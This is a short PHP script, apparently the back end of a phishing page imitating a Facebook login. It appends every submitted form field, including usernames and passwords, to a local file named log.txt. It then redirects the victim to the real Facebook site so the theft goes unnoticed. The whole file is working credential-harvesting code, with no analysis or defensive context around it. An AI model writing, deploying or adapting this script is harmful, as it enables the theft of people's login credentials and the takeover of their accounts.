<?php
//write the credentials to text file
$handle = fopen("log.txt", "a") or die("unable to open file!");
//extract the credentials received
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
//redirect the browser to original login page
header ('Location: http://www.facebook.com');
exit
?>